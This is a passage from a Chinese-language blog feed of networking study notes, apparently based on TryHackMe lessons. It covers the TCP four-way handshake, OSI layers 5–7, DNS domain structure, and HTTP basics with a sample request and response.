&lt;h5 id=&#34;四四次挥手断开连接确保双方说完所有话&#34;&gt;&lt;strong&gt;四、四次挥手：断开连接（确保双方说完所有话）&lt;/strong&gt;
&lt;/h5&gt;&lt;h6 id=&#34;场景讨论结束两人要挂电话&#34;&gt;&lt;strong&gt;场景&lt;/strong&gt;：讨论结束，两人要挂电话。
&lt;/h6&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;第一次挥手（FIN）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小明说：“&lt;strong&gt;我要说的都说完了，挂了吧！&lt;/strong&gt;”（发送 FIN 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小明等待小美确认（&lt;code&gt;FIN_WAIT_1&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二次挥手（ACK）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小美回应：“&lt;strong&gt;好的，我知道你说完了。&lt;/strong&gt;”（回复 ACK 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小美可能还有话要说（&lt;code&gt;CLOSE_WAIT&lt;/code&gt;），小明等待小美结束（&lt;code&gt;FIN_WAIT_2&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第三次挥手（FIN）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小美补充：“&lt;strong&gt;我也说完了，挂了吧！&lt;/strong&gt;”（发送 FIN 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小美等待小明确认（&lt;code&gt;LAST_ACK&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第四次挥手（ACK）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小明最后回应：“&lt;strong&gt;好的，再见！&lt;/strong&gt;”（发送 ACK 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小明等待片刻（&lt;code&gt;TIME_WAIT&lt;/code&gt;，防止小美没收到确认），双方挂断（&lt;code&gt;CLOSED&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;为什么需要四次？&lt;/strong&gt;
因为两人要 ​&lt;strong&gt;各自确认“我说完了”且“你也说完了”​&lt;/strong&gt;。小明先结束发言权，小美可能还有补充，最后双方才真正挂断。&lt;/p&gt;
&lt;hr&gt;
&lt;h5 id=&#34;五总结&#34;&gt;&lt;strong&gt;五、总结&lt;/strong&gt;
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;三次握手&lt;/strong&gt;：像打电话时的三次确认（“听得到吗？”→“听得到！你呢？”→“我也听得到！”）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;四次挥手&lt;/strong&gt;：像挂电话时的四次告别（“我说完了”→“好”→“我也说完了”→“好，再见！”）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;技术映射&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SYN&lt;/strong&gt;：发起通话请求（“你能听到吗？”）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACK&lt;/strong&gt;：确认收到消息（“好的”）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;FIN&lt;/strong&gt;：结束发言（“我挂了啊”）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第五层-会话层&#34;&gt;第五层 会话层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320172010792.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320172010792&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;一旦数据从表示层（第 6 层）正确转换或格式化，会话层（第 5 层）将开始创建和维护与数据目标的其他计算机的连接。建立连接后，将创建一个会话。当此连接处于活动状态时，会话也处于活动状态。&lt;/p&gt;
&lt;p&gt;会话层还负责关闭连接（如果连接有一段时间未使用或丢失）。此外，会话&lt;em&gt;可以&lt;/em&gt;包含“检查点”，如果数据丢失，则只需要发送最新的数据，从而节省带宽。&lt;/p&gt;
&lt;p&gt;值得注意的是，会话是唯一的，这意味着数据不能在不同的会话之间传输，而实际上只能在每个会话之间传输。&lt;/p&gt;
&lt;h3 id=&#34;第六层-表示层&#34;&gt;第六层 表示层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320172044624.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320172044624&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;OSI 模型的第 6 层是开始进行标准化的层。由于软件开发人员可以以不同的方式开发任何软件，例如电子邮件客户端，因此无论软件如何工作，数据仍然需要以相同的方式处理。&lt;/p&gt;
&lt;p&gt;该层充当数据进出应用程序层（第 7 层）的转换器。接收计算机还将理解以一种格式发送到计算机的数据，这些数据以另一种格式发送给计算机。例如，当您发送电子邮件时，其他用户可能有其他电子邮件客户端发送给您，但电子邮件的内容仍需要显示相同的内容。&lt;/p&gt;
&lt;p&gt;数据加密（如访问安全站点时的 HTTPS）等安全功能位于此层。&lt;/p&gt;
&lt;h3 id=&#34;第七层-应用层&#34;&gt;第七层 应用层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320172103033.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320172103033&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;SI 模型的应用层是您最熟悉的层。之所以如此熟悉，是因为应用程序层是协议和规则所在的层，用于确定用户应如何与发送或接收的数据进行交互。&lt;/p&gt;
&lt;p&gt;日常应用程序（如电子邮件客户端、浏览器或文件服务器浏览软件（如 FileZilla）为用户提供了一个友好的 &lt;strong&gt;G&lt;/strong&gt; &lt;strong&gt;实时用户界面&lt;/strong&gt; （&lt;strong&gt;GUI），&lt;/strong&gt; 以便与发送或接收的数据进行交互。其他协议包括 &lt;strong&gt;DNS&lt;/strong&gt; （&lt;strong&gt;D&lt;/strong&gt;omain &lt;strong&gt;N&lt;/strong&gt;ame &lt;strong&gt;S&lt;/strong&gt;ystem），这是网站地址转换为 IP 地址的方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320172114887.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320172114887&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DNS 详细信息</title>
        <link>https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background07.jpg" alt="Featured image of post DNS 详细信息" /&gt;&lt;h1 id=&#34;dns详细信息&#34;&gt;DNS详细信息
&lt;/h1&gt;&lt;p&gt;DNS（域名系统）为我们提供了一种与 Internet 上的设备进行通信的简单方法，而无需记住复数。就像每栋房子都有一个直接向其发送邮件的唯一地址一样，互联网上的每台计算机都有自己唯一的地址来与之通信，称为 IP 地址。IP 地址类似于以下 104.26.10.229,4 组数字，范围从 0 到 255，用句点分隔。当您想访问一个网站时，记住这组复杂的数字并不十分方便，而这正是 DNS 可以提供帮助的地方。因此，您可以记住 &lt;a class=&#34;link&#34; href=&#34;http://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com&lt;/a&gt;，而不是记住 104.26.10.229。&lt;/p&gt;
&lt;h2 id=&#34;域层次结构&#34;&gt;域层次结构
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319084618758.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;tld-顶级域名&#34;&gt;TLD （顶级域名）
&lt;/h3&gt;&lt;p&gt;TLD 是域名最右侧的部分。因此，例如，&lt;a class=&#34;link&#34; href=&#34;http://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com&lt;/a&gt; TLD 是 &lt;strong&gt;.com&lt;/strong&gt;。TLD 有两种类型，gTLD（通用顶级域名）和 ccTLD（国家代码顶级域名）。从历史上看，gTLD 旨在告诉用户域名的用途;例如，.com 用于商业目的，.org 用于组织，.edu 用于教育，.gov 用于政府。ccTLD 用于地理目的，例如 .ca 表示位于加拿大的站点，.co.uk 表示位于英国的站点，依此类推。由于这种需求，涌入了从 .online 、 .club 、 .website 、 .biz 等 新 gTLD 。&lt;/p&gt;
&lt;h3 id=&#34;二级域&#34;&gt;二级域
&lt;/h3&gt;&lt;p&gt;以 &lt;a class=&#34;link&#34; href=&#34;http://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com&lt;/a&gt; 为例，.com部分是 TLD，tryhackme 是二级域名。注册域名时，二级域名限制为 63 个字符 + TLD，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾或有连续的连字符）。&lt;/p&gt;
&lt;h3 id=&#34;子域&#34;&gt;子域
&lt;/h3&gt;&lt;p&gt;子域位于二级域的左侧，使用句点分隔它;例如，在 name &lt;a class=&#34;link&#34; href=&#34;http://admin.tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;admin.tryhackme.com&lt;/a&gt; 中，admin 部分是 subdomain。子域名的创建限制与二级域名相同，限制为 63 个字符，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。您可以使用多个子域（用句点拆分）来创建更长的名称，例如 &lt;a class=&#34;link&#34; href=&#34;http://jupiter.servers.tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;jupiter.servers.tryhackme.com&lt;/a&gt;。但长度必须保持在 253 个字符或更少。您可以为域名创建的子域数量没有限制。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HTTP 详细信息</title>
        <link>https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/9e73050aede3552bc3b00fe7cfe1120f427c37f01e08ad760bbdfa9abc939b1c.png" alt="Featured image of post HTTP 详细信息" /&gt;&lt;h1 id=&#34;http协议&#34;&gt;HTTP协议
&lt;/h1&gt;&lt;h2 id=&#34;什么是-http超文本传输协议&#34;&gt;什么是 HTTP？（超文本传输协议）
&lt;/h2&gt;&lt;p&gt;HTTP 是您查看网站时使用的工具，由 Tim Berners-Lee 和他的团队在 1989 年至 1991 年间开发。HTTP 是用于与 Web 服务器通信以传输网页数据（无论是 HTML、图像、视频等）的规则集。&lt;/p&gt;
&lt;h2 id=&#34;什么是-https-安全超文本传输协议&#34;&gt;什么是 HTTPS？ （安全超文本传输协议）
&lt;/h2&gt;&lt;p&gt;HTTPS 是 HTTP 的安全版本。 HTTPS 数据是加密的，因此它不仅可以阻止人们看到您接收和发送的数据，还可以确保您正在与正确的 Web 服务器通信，而不是冒充它。&lt;/p&gt;
&lt;h2 id=&#34;什么是-url统一资源定位器&#34;&gt;什么是 URL？（统一资源定位器）
&lt;/h2&gt;&lt;p&gt;如果您曾经使用过 Internet，那么您以前也使用过 URL。URL 主要是有关如何访问 Internet 上的资源的指令。下图显示了 URL 及其所有功能的外观（它不会在每个请求中使用所有功能）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319090006894.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Scheme&lt;/strong&gt;:这指示使用什么协议来访问资源，例如 HTTP、HTTPS、FTP（文件传输协议）。&lt;/li&gt;
&lt;li&gt;**User:**某些服务需要身份验证才能登录，您可以在 URL 中输入用户名和密码才能登录。&lt;/li&gt;
&lt;li&gt;**Host:**您要访问的服务器的域名或 IP 地址。&lt;/li&gt;
&lt;li&gt;**Port:**您要连接的端口，通常为 80 用于 HTTP，443 用于 HTTPS，但这可以托管在 1 - 65535 之间的任何端口上。&lt;/li&gt;
&lt;li&gt;**Path:**您尝试访问的资源的文件名或位置。&lt;/li&gt;
&lt;li&gt;**Query String:**可以发送到请求路径的额外信息位。例如，/blog？&lt;strong&gt;id=1&lt;/strong&gt; 将告知博客路径您希望接收 ID 为 1 的博客文章。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Fragment:&lt;/strong&gt; 这是对请求的实际页面上的位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到该页面，因此用户一旦访问该页面即可查看该页面。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;提出请求&#34;&gt;提出请求
&lt;/h2&gt;&lt;p&gt;只需一行 &lt;strong&gt;GET / HTTP/1.1&lt;/strong&gt; 就可以向 Web 服务器发出请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319090147014.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;但要获得更丰富的 Web 体验，您还需要发送其他数据。这些其他数据以所谓的 headers 形式发送，其中 header 包含额外的信息，以提供给您正在与之通信的 Web 服务器，但我们将在 Header 任务中对此进行更多介绍。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;请求示例：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  GET / HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: tryhackme.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 Firefox/87.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Referer: https://tryhackme.com/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第 1 行：&lt;/strong&gt; 此请求将发送 GET 方法（ 在 HTTP 方法 任务中，有更多相关信息），请求带有 / 的主页，并告知 Web 服务器我们使用的是 HTTP 协议版本 1.1。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 2 行：&lt;/strong&gt; 我们告诉 Web 服务器我们希望网站 tryhackme.com&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 3 行：&lt;/strong&gt; 我们告诉 Web 服务器我们使用的是 Firefox 版本 87 浏览器&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 4 行：&lt;/strong&gt; 我们告诉 Web 服务器，将我们引荐到此网页的网页是 &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tryhackme.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;**第 5 行：**HTTP 请求始终以空行结尾，以通知 Web 服务器请求已完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;响应示例：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  HTTP/1.1 200 OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server: nginx/1.15.8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Date: Fri, 09 Apr 2021 13:34:03 GMT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: text/html
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 98
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;title&amp;gt;TryHackMe&amp;lt;/title&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Welcome To TryHackMe.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第 1 行：&lt;/strong&gt; HTTP 1.1 是服务器正在使用的 HTTP 协议版本，然后是 HTTP 状态代码（在本例中为“200 Ok”），这告诉我们请求已成功完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 2 行：&lt;/strong&gt; 这告诉我们 Web 服务器软件和版本号。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 3 行：&lt;/strong&gt; Web 服务器的当前日期、时间和时区。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 4 行：&lt;/strong&gt; Content-Type 标头告诉客户端将发送哪种信息，例如 HTML、图像、视频、pdf、XML。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 5 行：&lt;/strong&gt; Content-Length 告诉客户端响应多长时间，这样我们就可以确认没有丢失数据&lt;/p&gt;
&lt;p&gt;**第 6 行：**HTTP 响应包含一个空行，用于确认 HTTP 响应的结束。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 7-14 行：&lt;/strong&gt; 已请求的信息，在本例中为主页。&lt;/p&gt;
&lt;h2 id=&#34;http方法&#34;&gt;HTTP方法
&lt;/h2&gt;&lt;h3 id=&#34;get-request&#34;&gt;GET Request
&lt;/h3&gt;&lt;p&gt;这用于从 Web 服务器获取信息。&lt;/p&gt;
&lt;h3 id=&#34;post-request&#34;&gt;POST Request
&lt;/h3&gt;&lt;p&gt;这用于将数据提交到 Web 服务器并可能创建新记录&lt;/p&gt;
&lt;h3 id=&#34;put-request&#34;&gt;PUT Request
&lt;/h3&gt;&lt;p&gt;这用于将数据提交到 Web 服务器以更新信息&lt;/p&gt;
&lt;h3 id=&#34;delete-request&#34;&gt;DELETE Request
&lt;/h3&gt;&lt;p&gt;这用于从 Web 服务器中删除信息/记录。&lt;/p&gt;
&lt;h2 id=&#34;http-协议状态代码&#34;&gt;HTTP 协议状态代码：
&lt;/h2&gt;&lt;p&gt;在上一个任务中，您了解到，当 HTTP 服务器响应时，第一行始终包含一个状态代码，告知客户端其请求的结果以及可能如何处理该请求。这些状态代码可以分为 5 个不同的范围：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;100-199 - Information Response 100-199 - 信息响应&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;发送这些请求是为了告诉客户端其请求的第一部分已被接受，他们应该继续发送请求的其余部分。这些代码不再很常见。&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
